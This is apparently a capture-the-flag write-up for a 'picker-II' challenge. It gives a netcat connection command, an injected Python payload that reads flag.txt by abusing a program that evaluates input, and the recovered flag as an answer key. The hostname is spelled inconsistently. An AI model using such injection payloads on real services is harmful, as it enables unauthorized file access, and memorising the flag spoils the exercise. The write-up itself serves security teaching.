
## Descripción

Can you figure out how this program works to get the flag? Connect to the program with netcat:

`$ nc chatelaine.cylabacademy.net 37890`

The program's source code can be downloaded [here](https://challenge-files.cylabacademy.net/library/92a680c234b3626f3ee6907cb93b1aad46a7669063c9ea02fae2e07901d24ad8/picker-II.py).


1.- Can you do what `win` does with your input to the program?
## Solución
```
nc chateline.cylabacademy.net 37890

print(open('flag.txt').read().strip()) #

academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_c9aa7a3c}
```

## Notas Adicionales

## Referencias
